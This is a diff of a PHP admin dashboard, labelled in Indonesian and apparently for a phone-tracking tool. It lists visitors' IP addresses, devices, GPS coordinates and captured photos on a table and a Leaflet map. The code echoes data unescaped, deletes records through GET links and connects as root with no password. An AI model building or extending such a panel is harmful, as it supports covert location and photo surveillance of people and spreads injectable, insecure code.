@@ -1,94 +1,75 @@
 <?php
-
 session_start();
 
-if(!isset($_SESSION['admin'])) {
+if (!isset($_SESSION['login'])) {
     header("Location: login.php");
-    exit();
+    exit;
 }
 
-// ===============================
-// DATABASE
-// ===============================
-$host = "localhost";
-$user = "root";
-$pass = "";
-$db   = "lacak_hp";
+// koneksi database
+$conn = new mysqli("localhost", "root", "", "global");
 
-$conn = new mysqli($host, $user, $pass, $db);
-
-$result = $conn->query("SELECT * FROM pengunjung ORDER BY id DESC");
-
-$mapData = $conn->query("SELECT * FROM pengunjung");
-
-$locations = [];
-
-while($row = $mapData->fetch_assoc()) {
-
-    if(strpos($row['lokasi'], ",") !== false) {
-
-        $locations[] = [
-            "ip" => $row['ip_address'],
-            "lokasi" => $row['lokasi'],
-            "perangkat" => $row['perangkat'],
-            "foto" => $row['foto'],
-            "waktu" => $row['waktu']
-        ];
-    }
+if ($conn->connect_error) {
+    die("Koneksi gagal");
 }
 
+// ambil data
+$data = $conn->query("SELECT * FROM perangkat ORDER BY id DESC");
+$total = $conn->query("SELECT COUNT(*) as jumlah FROM perangkat")->fetch_assoc()['jumlah'];
 ?>
 
 <!DOCTYPE html>
 <html>
-
 <head>
 
-<title>Admin Panel</title>
+<title>GLOBAL ADMIN</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <style>
 
 body {
     margin:0;
-    background:#0a0a0a;
+    font-family: Arial;
+    background:#0f172a;
     color:white;
-    font-family:Arial;
 }
 
 header {
-    background:black;
+    background:#020617;
     padding:15px;
     display:flex;
     justify-content:space-between;
-}
-
-.logout {
-    background:red;
-    padding:8px 15px;
-    color:white;
-    text-decoration:none;
+    align-items:center;
 }
 
 .container {
     padding:20px;
 }
 
+.card {
+    background:#1e293b;
+    padding:20px;
+    border-radius:10px;
+    margin-bottom:20px;
+}
+
 table {
     width:100%;
     border-collapse:collapse;
-    background:#111;
-}
-
-th, td {
-    border:1px solid #333;
-    padding:10px;
-    text-align:center;
 }
 
 th {
-    background:#222;
+    background:#020617;
+    padding:10px;
+}
+
+td {
+    padding:10px;
+    border-bottom:1px solid #334155;
 }
 
 img {
@@ -96,65 +77,143 @@ img {
     border-radius:5px;
 }
 
-#map {
-    height:450px;
-    margin-top:30px;
-    border-radius:10px;
+button {
+    padding:6px 12px;
+    border:none;
+    border-radius:5px;
+    cursor:pointer;
 }
 
-.popup-img {
-    width:120px;
-    border-radius:5px;
+.hapus {
+    background:red;
+    color:white;
+}
+
+.logout {
+    background:orange;
+}
+
+.hapus-semua {
+    background:crimson;
+    color:white;
+}
+
+#map {
+    height:400px;
+    border-radius:10px;
 }
 
 </style>
 
 </head>
-
 <body>
 
 <header>
 
-<div>ADMIN PANEL</div>
+<h2>GLOBAL ADMIN</h2>
 
-<a class="logout" href="logout.php">Logout</a>
+<div>
+
+<a href="hapus_semua.php">
+<button class="hapus-semua">Hapus Semua</button>
+</a>
+
+<a href="logout.php">
+<button class="logout">Logout</button>
+</a>
+
+</div>
 
 </header>
 
+
 <div class="container">
 
-<h2>Data Pengunjung</h2>
+<!-- TOTAL -->
+<div class="card">
+
+<h3>Total Perangkat</h3>
+<h1><?php echo $total; ?></h1>
+
+</div>
+
+
+<!-- MAP -->
+<div class="card">
+
+<h3>Peta Lokasi Perangkat</h3>
+
+<div id="map"></div>
+
+</div>
+
+
+<!-- TABEL -->
+<div class="card">
+
+<h3>Data Perangkat</h3>
 
 <table>
 
 <tr>
 <th>ID</th>
 <th>IP</th>
-<th>Lokasi</th>
-<th>Perangkat</th>
-<th>Foto</th>
+<th>Device</th>
+<th>Platform</th>
+<th>Bahasa</th>
 <th>Waktu</th>
+<th>Lokasi</th>
+<th>Foto</th>
+<th>Aksi</th>
 </tr>
 
-<?php while($row = $result->fetch_assoc()) { ?>
+<?php while($row = $data->fetch_assoc()) { ?>
 
 <tr>
 
 <td><?php echo $row['id']; ?></td>
 
-<td><?php echo $row['ip_address']; ?></td>
+<td><?php echo $row['ip']; ?></td>
 
-<td><?php echo $row['lokasi']; ?></td>
+<td><?php echo $row['device']; ?></td>
 
-<td style="font-size:12px">
-<?php echo $row['perangkat']; ?>
+<td><?php echo $row['platform']; ?></td>
+
+<td><?php echo $row['bahasa']; ?></td>
+
+<td><?php echo $row['waktu_server']; ?></td>
+
+<td>
+
+<?php echo $row['latitude']; ?> ,
+<?php echo $row['longitude']; ?>
+
+<br>
+
+<a target="_blank"
+href="https://www.google.com/maps?q=<?php echo $row['latitude']; ?>,<?php echo $row['longitude']; ?>">
+Lihat Map
+</a>
+
 </td>
 
 <td>
+
+<?php if($row['foto']!=""){ ?>
+
 <img src="foto/<?php echo $row['foto']; ?>">
+
+<?php } ?>
+
 </td>
 
-<td><?php echo $row['waktu']; ?></td>
+<td>
+
+<a href="hapus.php?id=<?php echo $row['id']; ?>">
+<button class="hapus">Hapus</button>
+</a>
+
+</td>
 
 </tr>
 
@@ -162,49 +221,42 @@ img {
 
 </table>
 
-<h2>Peta Lokasi Pengunjung</h2>
-
-<div id="map"></div>
+</div>
 
 </div>
 
-<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
+<!-- MAP SCRIPT -->
 <script>
 
-var map = L.map('map').setView([-2.5, 118], 5);
+var map = L.map('map').setView([-2.5,118],5);
 
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: 'OpenStreetMap'
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+    attribution:'Map'
 }).addTo(map);
 
-var data = <?php echo json_encode($locations); ?>;
+<?php
 
-data.forEach(function(user){
+$dataMap = $conn->query("SELECT * FROM perangkat");
 
-    var parts = user.lokasi.split(",");
+while($m = $dataMap->fetch_assoc()){
 
-    var lat = parseFloat(parts[0]);
-    var lng = parseFloat(parts[1]);
+    if($m['latitude'] != "-" && $m['longitude'] != "-"){
 
-    if(!isNaN(lat) && !isNaN(lng)) {
-
-        var popup = `
-            <b>IP:</b> ${user.ip}<br>
-            <b>Lokasi:</b> ${user.lokasi}<br>
-            <b>Perangkat:</b><br>
-            <small>${user.perangkat}</small><br>
-            <b>Waktu:</b> ${user.waktu}<br><br>
-            <img class="popup-img" src="foto/${user.foto}">
-        `;
-
-        L.marker([lat, lng])
+        echo "
+        L.marker([".$m['latitude'].", ".$m['longitude']."])
         .addTo(map)
-        .bindPopup(popup);
+        .bindPopup(
+        'IP: ".$m['ip']."<br>
+         Device: ".$m['platform']."<br>
+         Waktu: ".$m['waktu_server']."'
+        );
+        ";
 
     }
 
-});
+}
+?>
 
 </script>
 
